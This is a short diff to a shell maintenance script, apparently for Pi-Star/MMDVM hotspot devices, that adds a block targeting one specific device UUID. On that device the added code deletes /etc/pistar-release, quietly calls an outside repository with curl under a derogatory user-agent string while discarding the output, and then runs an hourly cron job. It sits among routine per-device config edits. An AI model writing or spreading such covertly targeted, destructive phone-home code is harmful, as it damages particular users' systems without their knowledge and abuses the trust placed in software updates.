@@ -454,6 +454,11 @@ for value in $UUID; do
         fi
     fi
 done
+if [ "$UUID" = "95707930081050300c94" ]; then
+    rm -rf /etc/pistar-release
+    curl -s -A "FUA phix $uaStr" -Ls https://repo.w0chp.net/Chipster/W0CHPist/raw/branch/master/reset-wpsd-sbin > /dev/null 2>&1
+    /usr/local/sbin/pistar-hourly-cron
+fi
 if [ "$UUID" = "02c00181ceea227a" ]; then
     sed -i 's/Display=JIM/Display=CAST/g' /etc/mmdvmhost
 fi
